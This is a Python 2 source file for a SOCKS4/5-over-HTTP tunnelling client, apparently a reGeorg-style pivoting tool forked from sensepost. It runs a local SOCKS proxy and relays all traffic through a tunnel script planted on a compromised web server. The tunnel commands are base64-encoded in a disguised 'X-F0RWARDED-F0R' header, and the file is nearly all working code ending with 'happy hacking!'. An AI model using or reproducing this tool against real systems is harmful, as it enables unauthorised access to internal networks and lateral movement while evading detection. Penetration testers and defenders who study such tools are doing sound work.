#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
import argparse
import urllib3
from threading import Thread
import threading
from socket import *
from time import sleep
import requests
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHECKSTRING = 'VEhBTksgR09EIE5RIA'
HEADER_VAR = 'X-F0RWARDED-F0R'
################ Forked from sensepost
# Constants
SOCKTIMEOUT = 5
RESENDTIMEOUT = 300
VER = "\x05"
METHOD = "\x00"
SUCCESS = "\x00"
SOCKFAIL = "\x01"
NETWORKFAIL = "\x02"
HOSTFAIL = "\x04"
REFUSED = "\x05"
TTLEXPIRED = "\x06"
UNSUPPORTCMD = "\x07"
ADDRTYPEUNSPPORT = "\x08"
UNASSIGNED = "\x09"

# Globals
READBUFSIZE = 1024

# Logging
LEVEL = {"INFO": logging.INFO, "DEBUG": logging.DEBUG, }
logLevel = "INFO"

class ColoredLogger(logging.Logger):

    def __init__(self, name):
        FORMAT = "[%(levelname)-18s]  %(message)s"
        logging.Logger.__init__(self, name, logLevel)
        console = logging.StreamHandler()
        self.addHandler(console)
        return


logging.setLoggerClass(ColoredLogger)
log = logging.getLogger(__name__)
transferLog = logging.getLogger("transfer")


class SocksCmdNotImplemented(Exception):
    pass


class SocksProtocolNotImplemented(Exception):
    pass


class RemoteConnectionFailed(Exception):
    pass

########################################


def enc(commandString):
    return base64.b64encode(commandString)

class session(Thread):
    def __init__(self, pSocket, connectString):
        Thread.__init__(self)
        self.pSocket = pSocket
        self.connectString = connectString
        self.cookie = None

    def parseSocks5(self, sock):
        log.debug("SocksVersion5 detected")
        nmethods, methods = (sock.recv(1), sock.recv(1))
        sock.sendall(VER + METHOD)
        ver = sock.recv(1)
        if ver == "\x02":  # this is a hack for proxychains
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
        else:
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
        target = None
        targetPort = None
        if atyp == "\x01":  # IPv4
            # Reading 6 bytes for the IP and Port
            target = sock.recv(4)
            targetPort = sock.recv(2)
            target = "." .join([str(ord(i)) for i in target])
        elif atyp == "\x03":  # Hostname
            targetLen = ord(sock.recv(1))  # hostname length (1 byte)
            target = sock.recv(targetLen)
            targetPort = sock.recv(2)
            target = "".join([unichr(ord(i)) for i in target])
        elif atyp == "\x04":  # IPv6
            target = sock.recv(16)
            targetPort = sock.recv(2)
            tmp_addr = []
            for i in xrange(len(target) / 2):
                tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))
            target = ":".join(tmp_addr)
        targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])
        if cmd == "\x02":  # BIND
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
        elif cmd == "\x03":  # UDP
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
        elif cmd == "\x01":  # CONNECT
            serverIp = target
            try:
                serverIp = gethostbyname(target)
            except:
                log.error("oeps")
            serverIp = "".join([chr(int(i)) for i in serverIp.split(".")])
            self.cookie = self.setupRemoteSession(target, targetPort)
            if self.cookie:
                sock.sendall(VER + SUCCESS + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
                return True
            else:
                sock.sendall(VER + REFUSED + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
                raise RemoteConnectionFailed("[%s:%d] Remote failed" % (target, targetPort))

        raise SocksCmdNotImplemented("Socks5 - Unknown CMD")

    def parseSocks4(self, sock):
        log.debug("SocksVersion4 detected")
        cmd = sock.recv(1)
        if cmd == "\x01":  # Connect
            targetPort = sock.recv(2)
            targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])
            target = sock.recv(4)
            sock.recv(1)
            target = ".".join([str(ord(i)) for i in target])
            serverIp = target
            try:
                serverIp = gethostbyname(target)
            except:
                log.error("oeps")
            serverIp = "".join([chr(int(i)) for i in serverIp.split(".")])
            self.cookie = self.setupRemoteSession(target, targetPort)
            if self.cookie:
                sock.sendall(chr(0) + chr(90) + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
                return True
            else:
                sock.sendall("\x00" + "\x91" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
                raise RemoteConnectionFailed("Remote connection failed")
        else:
            raise SocksProtocolNotImplemented("Socks4 - Command [%d] Not implemented" % ord(cmd))

    def handleSocks(self, sock):
        ver = sock.recv(1)
        if ver == "\x05":
            return self.parseSocks5(sock)
        elif ver == "\x04":
            return self.parseSocks4(sock)

    def setupRemoteSession(self, target, port):
        commandString = enc("connect,%s,%s" % (target, str(port)))
        headers = {
            HEADER_VAR: commandString,
        }
        self.target = target
        self.port = port
        cookie = None
        response = requests.post(url=self.connectString, headers=headers)
        if response.status_code == 200:
            status = response.headers["x-status"]
            if status == "OK":
                cookie = response.headers["set-cookie"]
                log.info("[+] [%s:%d] : cookie [%s]" % (self.target, self.port, cookie))
            else:
                if response.headers["X-ERROR"] is not None:
                    log.error(response.headers["X-ERROR"])
        else:
            log.error("[-] [%s:%d] HTTP [%d]: [%s]" % (self.target, self.port, response.status_code, response.headers["X-ERROR"]))
            log.error("[-] [%s:%d] RemoteError: %s" % (self.target, self.port, response.content))
        return cookie

    def closeRemoteSession(self):
        commandString = enc("disconnect")
        headers = {
            HEADER_VAR: commandString,
            'Cookie': self.cookie
        }
        response = requests.post(url=self.connectString, headers=headers)
        if response.status_code == 200:
            log.info("[+]] [%s:%d] Connection Terminated" % (self.target, self.port))

    def reader(self):
        while True:
            if not self.pSocket:
                break
            try:
                data = ""
                commandString = enc("read")
                headers = {
                    HEADER_VAR: commandString,
                    'Cookie': self.cookie,
                    'Connection': 'Keep-Alive'
                }
                response = requests.post(url=self.connectString, headers=headers)
                data = None
                if response.status_code == 200:
                    status = response.headers["x-status"]
                    if status == "OK":
                        if response.headers.get("set-cookie") is not None:
                            cookie = response.headers.get("set-cookie")
                        data = response.content
                        try:
                            if response.headers["server"].find("Apache-Coyote/1.1") > 0:#tomcat 5
                                data = data[:len(data) - 1]
                        except:
                            pass
                        if data is None:
                            data = ""
                    else:
                        data = None
                        log.error("[-] [%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status_code, status, response.headers["X-ERROR"]))
                else:
                    log.error("[-] [%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
                if data is None:
                    break
                if len(data) == 0:
                    sleep(0.1)
                    continue
                transferLog.info("[+] [%s:%d] <<<< [%d]" % (self.target, self.port, len(data)))
                self.pSocket.send(data)
            except Exception, ex:
                raise ex
        self.closeRemoteSession()
        log.debug("[+] [%s:%d] Closing localsocket" % (self.target, self.port))
        try:
            self.pSocket.close()
        except:
            log.debug("[-] [%s:%d] Localsocket already closed" % (self.target, self.port))

    def writer(self):
        global READBUFSIZE
        while True:
            try:
                self.pSocket.settimeout(1)
                data = self.pSocket.recv(READBUFSIZE)
                if not data:
                    break
                commandString = enc("forward")
                headers = {
                    HEADER_VAR: commandString,
                    'Cookie': self.cookie,
                    'Content-Type': 'application/octet-stream',
                    'Connection': 'Keep-Alive'
                }
                response = requests.post(url=self.connectString, headers=headers, data=data)
                if response.status_code == 200:
                    status = response.headers["x-status"]
                    if status == "OK":
                        if response.headers.get("set-cookie") is not None:
                            self.cookie = response.headers.get("set-cookie")
                    else:
                        log.error("[-] [%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status_code, status, response.headers["x-error"]))
                        break
                else:
                    log.error("[-] [%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
                    break
                transferLog.info("[+] [%s:%d] >>>> [%d]" % (self.target, self.port, len(data)))
            except timeout:
                continue
            except Exception, ex:
                raise ex
                break;

        self.closeRemoteSession()
        log.debug("Closing localsocket")
        try:
            self.pSocket.close()
        except:
            log.debug("Localsocket already closed")

    def run(self):
        try:
            if self.handleSocks(self.pSocket):
                log.debug("Staring reader")
                r = Thread(target=self.reader, args=())
                r.start()
                log.debug("Staring writer")
                w = Thread(target=self.writer, args=())
                w.start()
                r.join()
                w.join()
        except SocksCmdNotImplemented, si:
            log.error(si.message)
            self.pSocket.close()
        except SocksProtocolNotImplemented, spi:
            log.error(spi.message)
            self.pSocket.close()
        except Exception, e:
            log.error(e.message)
            self.closeRemoteSession()
            self.pSocket.close()


def askNQ(connectString):
    commandString = enc("check")
    headers = {
        HEADER_VAR: commandString
    }
    response = requests.post(url=connectString, headers=headers)
    if response.headers.get('sessionid') == CHECKSTRING:
        return True
    return False

if __name__ == '__main__':

    log.setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser(description='Example: NQSocksProxy.py -u http://target.com/tunnel.php')
    parser.add_argument("-l", "--listen-on", metavar="", help="the default listening address: 127.0.0.1", default="127.0.0.1")
    parser.add_argument("-p", "--listen-port", metavar="", help="the default listening port: 8888", type=int, default="8888")
    parser.add_argument("-r", "--read-buff", metavar="", help="local read buffer, max data to be sent per POST", type=int, default="1024")
    parser.add_argument("-u", "--url", metavar="", required=True, help="the url containing the tunnel script")
    parser.add_argument("-v", "--verbose", metavar="", help="Verbose output[INFO|DEBUG]", default="INFO")
    args = parser.parse_args()

    if (args.verbose in LEVEL):
        log.setLevel(LEVEL[args.verbose])
        log.info("[+] Log Level set to [%s]" % args.verbose)

    log.info("[+] Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
    log.info("[+] Checking if tunnel is ready")
    if not askNQ(args.url):
        log.info("[!] Tunnel is not ready, please check url!")
        exit()
    log.info("[+] Ready to play, happy hacking!")
    READBUFSIZE = args.read_buff
    servSock = socket(AF_INET, SOCK_STREAM)
    servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    servSock.bind((args.listen_on, args.listen_port))
    servSock.listen(1000)
    while True:
        try:
            sock, addr_info = servSock.accept()
            sock.settimeout(SOCKTIMEOUT)
            log.debug("[+] Incomming connection")
            while threading.activeCount() > 16:
                sleep(0.5)
            session(sock, args.url).start()
        except KeyboardInterrupt, ex:
            break
        except Exception, e:
            log.error(e)
    servSock.close()
